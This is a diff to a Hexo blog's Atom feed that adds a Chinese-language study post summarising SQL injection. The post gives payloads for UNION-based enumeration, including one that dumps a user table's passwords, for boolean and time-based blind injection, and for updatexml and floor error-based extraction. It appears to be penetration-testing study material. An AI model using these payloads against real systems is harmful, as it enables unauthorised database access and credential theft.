@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2020-12-06T07:33:39.646Z</updated>
+  <updated>2020-12-08T14:35:43.989Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sql注入总结</title>
+    <link href="http://example.com/wiki/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
+    <id>http://example.com/wiki/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
+    <published>2020-12-06T10:06:52.000Z</published>
+    <updated>2020-12-08T14:35:43.989Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="各种sql注入的收集以及利用"><a href="#各种sql注入的收集以及利用" class="headerlink" title="各种sql注入的收集以及利用"></a>各种sql注入的收集以及利用</h1><h2 id="sql注入的收集"><a href="#sql注入的收集" class="headerlink" title="sql注入的收集"></a>sql注入的收集</h2><p>在任何与数据库有参数的传递的地方均可能出现sql注入。</p><p>如：搜索框，url中的参数，登录页面（后台页面中居多），搜索框，http头…</p><p>判断方法：</p><p>在参数中加一个 ′ 号，如果报错则存在又注入漏洞</p><p>数字型：若语句为id=1 and  1=1# 正常，若id=1 and  1=2#报错，则为数字型。</p><p>字符型：若语句为id=1’ and ‘1’ =’1’# 正常，若id=1’ and ‘1’ =’2’#报错，则为字符型。</p><h2 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h2><h3 id="union型"><a href="#union型" class="headerlink" title="union型"></a>union型</h3><p>最重要的是找到闭合的规则。</p><p>可以直接利用查询语句查询数据库内容（权限允许）。</p><p>order by 查询字段数。</p><p>查询当前数据库,当前mysql用户 </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">user</span>(),<span class="title">database</span>()</span></span><br></pre></td></tr></table></figure><p>查询当前数据库里面的表 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=&quot;data_name&quot;</span><br></pre></td></tr></table></figure><p>查询到敏感表名user，继续查询表里面的字段 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=&quot;user&quot;</span><br></pre></td></tr></table></figure><p>查询字段，例如“id”、”passwd”的内容 </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">id</span>,<span class="title">passwd</span> <span class="title">from</span> <span class="title">user</span></span></span><br></pre></td></tr></table></figure><h3 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h3><p>查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错。</p><p>只能通过注入语句，返回的页面有没有报错而判定信息。</p><p>先用 </p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">and</span></span> <span class="function"><span class="title"><span class="built_in">length</span></span>(<span class="title">database</span>())&gt;<span class="number">2</span></span></span><br></pre></td></tr></table></figure><p> 来猜数据库的长度，使用的是二分法。</p><p>再用 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> substr(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;t&#x27;</span> </span><br></pre></td></tr></table></figure><p>来确定第一个字母，可用burp跑，26个字母,哪个字母返回正常则代表第一个字母就是它。</p><p>结合适合的长度进行猜解。</p><p>后面的所有信息都像union注入一般进行，但是要一个一个进行猜解，需要时间很长。</p><h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p>注入点有sql的报错信息就可以进行报错注入</p><p>形如布尔盲注，只要猜解出闭合类型，返回正常即可进行注入</p><p>报错获取当前数据库语句：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select database()),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>floor报错获取当前数据库：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> count(*),concat((<span class="keyword">database</span>()),floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>后面的信息获取语句形如union类型</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>当页面有注入时，可以尝试加下面这个函数测试</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title"><span class="built_in">sleep</span></span>(<span class="number">5</span>);</span></span><br></pre></td></tr></table></figure><p>如果有页面延迟5秒以上时则为时间盲注</p><p>接着猜出闭合的类型</p><p>形如布尔盲注一步一步获取信息</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;各种sql注入的收集以及利用&quot;&gt;&lt;a href=&quot;#各种sql注入的收集以及利用&quot; class=&quot;headerlink&quot; title=&quot;各种sql注入的收集以及利用&quot;&gt;&lt;/a&gt;各种sql注入的收集以及利用&lt;/h1&gt;&lt;h2 id=&quot;sql注入的收集&quot;&gt;&lt;a href</summary>
+      
+    
+    
+    
+    <category term="渗透学习" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>再用博客</title>
